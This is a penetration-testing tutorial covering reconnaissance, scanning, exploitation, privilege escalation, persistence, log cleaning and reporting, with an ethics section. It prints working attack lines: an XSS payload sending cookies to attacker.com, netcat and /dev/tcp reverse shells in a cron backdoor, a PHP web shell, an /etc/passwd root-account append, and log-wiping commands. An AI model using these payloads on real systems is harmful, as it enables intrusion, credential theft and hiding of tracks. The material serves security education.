# 🎯 Penetration Testing - Complete Deep Dive

## Penetration Testing Methodology

### Phases
```
1. Reconnaissance (Information Gathering)
2. Scanning (Vulnerability Identification)
3. Gaining Access (Exploitation)
4. Maintaining Access (Persistence)
5. Covering Tracks (Cleanup)
6. Reporting
```

---

## Phase 1: Reconnaissance

### Passive Reconnaissance
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
nslookup target.com
dig target.com ANY

# Google dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"

# Shodan (search engine for IoT)
shodan search "target.com"

# theHarvester (email gathering)
theHarvester -d target.com -b google
```

### Active Reconnaissance
```bash
# Nmap - Network scanning
nmap -sV -sC target.com
# -sV: Version detection
# -sC: Default scripts

# Subdomain enumeration
sublist3r -d target.com

# Directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Technology detection
whatweb target.com
```

---

## Phase 2: Scanning

### Port Scanning
```bash
# Quick scan (top 1000 ports)
nmap -T4 target.com

# Full scan (all 65535 ports)
nmap -p- target.com

# Service version detection
nmap -sV -p 80,443,22 target.com

# OS detection
nmap -O target.com

# Aggressive scan
nmap -A target.com
```

### Vulnerability Scanning
```bash
# Nmap NSE scripts
nmap --script vuln target.com

# Nikto (web server scanner)
nikto -h http://target.com

# OpenVAS (comprehensive scanner)
openvas-start
# Access web interface: https://localhost:9392

# SQLmap (SQL injection)
sqlmap -u "http://target.com/page?id=1" --dbs
```

---

## Phase 3: Exploitation

### Web Application Exploitation

#### SQL Injection
```python
# Manual testing
# Test payload: ' OR '1'='1
# URL: http://target.com/login?user=admin' OR '1'='1'--&pass=anything

# SQLmap automation
sqlmap -u "http://target.com/page?id=1" --dump

# Example vulnerable code
query = f"SELECT * FROM users WHERE username='{username}'"
# Attack: username = "admin' --"
# Result: SELECT * FROM users WHERE username='admin' --'
```

#### XSS (Cross-Site Scripting)
```javascript
// Reflected XSS
<script>alert(document.cookie)</script>

// Stored XSS
<img src=x onerror="fetch('http://attacker.com?cookie='+document.cookie)">

// DOM-based XSS
<script>
document.write(location.hash.substring(1));
</script>
// URL: http://target.com#<script>alert(1)</script>
```

#### Command Injection
```bash
# Vulnerable parameter
http://target.com/ping?host=8.8.8.8

# Attack payload
http://target.com/ping?host=8.8.8.8;cat /etc/passwd

# Reverse shell
http://target.com/ping?host=8.8.8.8;nc -e /bin/bash attacker.com 4444
```

### Network Exploitation

#### Metasploit Framework
```bash
# Start Metasploit
msfconsole

# Search exploits
search ms17-010  # EternalBlue

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# Meterpreter commands
sysinfo          # System information
getuid           # Current user
hashdump         # Dump password hashes
screenshot       # Take screenshot
shell            # Get system shell
```

#### Password Cracking
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat (GPU-accelerated)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
# -m 0: MD5
# -a 0: Dictionary attack

# Hydra (online brute force)
hydra -l admin -P passwords.txt ssh://target.com
```

---

## Phase 4: Post-Exploitation

### Privilege Escalation

#### Linux
```bash
# Check sudo permissions
sudo -l

# SUID binaries
find / -perm -4000 2>/dev/null

# Kernel exploits
uname -a
searchsploit linux kernel 4.15

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Writable /etc/passwd
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
```

#### Windows
```powershell
# Check privileges
whoami /priv

# Unquoted service paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
```

### Persistence
```bash
# Add SSH key
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Cron job backdoor
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -

# Web shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

---

## Phase 5: Covering Tracks

### Log Cleaning
```bash
# Clear bash history
history -c
rm ~/.bash_history

# Clear system logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Disable logging temporarily
service rsyslog stop
```

### Timestomping
```bash
# Match file timestamps
touch -r /etc/passwd backdoor.sh
```

---

## Tools Mastery

### Burp Suite
```
1. Proxy → Intercept requests
2. Repeater → Modify and resend
3. Intruder → Automated attacks
4. Scanner → Vulnerability scanning
5. Decoder → Encode/decode data

Common workflows:
- Intercept login request
- Send to Repeater
- Test SQL injection payloads
- Analyze responses
```

### Nmap Scripts
```bash
# HTTP enumeration
nmap --script http-enum target.com

# SMB vulnerabilities
nmap --script smb-vuln* target.com

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 target.com

# Brute force
nmap --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt target.com
```

### Wireshark
```
# Capture filters
tcp port 80
host 192.168.1.1
not arp

# Display filters
http.request.method == "POST"
tcp.flags.syn == 1
ip.addr == 192.168.1.1

# Follow TCP stream
Right-click packet → Follow → TCP Stream
```

---

## Reporting

### Report Structure
```
1. Executive Summary
   - High-level findings
   - Business impact
   - Recommendations

2. Methodology
   - Scope
   - Tools used
   - Testing approach

3. Findings
   - Vulnerability details
   - Severity rating (Critical/High/Medium/Low)
   - Proof of concept
   - Remediation steps

4. Appendix
   - Detailed technical data
   - Screenshots
   - Tool outputs
```

### Severity Rating
```
Critical: Remote code execution, full system compromise
High: Privilege escalation, sensitive data exposure
Medium: Information disclosure, weak encryption
Low: Security misconfiguration, outdated software
```

### Example Finding
```markdown
## SQL Injection in Login Form

**Severity:** Critical
**CVSS Score:** 9.8

**Description:**
The login form at /login.php is vulnerable to SQL injection.

**Proof of Concept:**
Username: admin' OR '1'='1'--
Password: anything

**Impact:**
- Complete database compromise
- Access to all user credentials
- Potential for remote code execution

**Remediation:**
1. Use parameterized queries
2. Implement input validation
3. Apply principle of least privilege to database user

**Code Fix:**
```python
# Before (vulnerable)
query = f"SELECT * FROM users WHERE username='{username}'"

# After (secure)
query = "SELECT * FROM users WHERE username=?"
cursor.execute(query, (username,))
```
```

---

## Practice Platforms

### Beginner
```
- DVWA (Damn Vulnerable Web Application)
- WebGoat (OWASP)
- bWAPP (Buggy Web Application)
- Juice Shop (OWASP)
```

### Intermediate
```
- HackTheBox (hackthebox.eu)
- TryHackMe (tryhackme.com)
- PentesterLab (pentesterlab.com)
- VulnHub (vulnhub.com)
```

### Advanced
```
- Offensive Security Labs (OSCP prep)
- HackTheBox Pro Labs
- Real-world bug bounty programs
```

---

## Legal & Ethical Considerations

### Rules of Engagement
```
✅ Written authorization required
✅ Define scope clearly
✅ Set testing timeframe
✅ Establish communication channels
✅ Define acceptable actions
✅ Data handling procedures

❌ Never test without permission
❌ Don't exceed authorized scope
❌ Don't cause damage/disruption
❌ Don't access/modify data unnecessarily
```

### Bug Bounty Programs
```
Platforms:
- HackerOne
- Bugcrowd
- Synack
- Intigriti

Tips:
- Read program rules carefully
- Start with low-hanging fruit
- Document everything
- Write clear reports
- Be professional
```

---

## Summary

### Pentest Checklist
```
Reconnaissance:
- [ ] WHOIS/DNS enumeration
- [ ] Subdomain discovery
- [ ] Technology fingerprinting
- [ ] Google dorking

Scanning:
- [ ] Port scanning
- [ ] Service enumeration
- [ ] Vulnerability scanning
- [ ] Web application scanning

Exploitation:
- [ ] SQL injection testing
- [ ] XSS testing
- [ ] Authentication bypass
- [ ] File upload vulnerabilities

Post-Exploitation:
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Data exfiltration
- [ ] Persistence

Reporting:
- [ ] Document all findings
- [ ] Provide remediation steps
- [ ] Include proof of concepts
- [ ] Rate severity appropriately
```

### Essential Commands
```bash
# Reconnaissance
nmap -sV -sC target.com
whois target.com
theHarvester -d target.com -b google

# Exploitation
sqlmap -u "URL" --dbs
msfconsole
hydra -l user -P pass.txt ssh://target

# Post-Exploitation
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
```

---

**Next:** [05_Network_Security.md](./05_Network_Security.md)
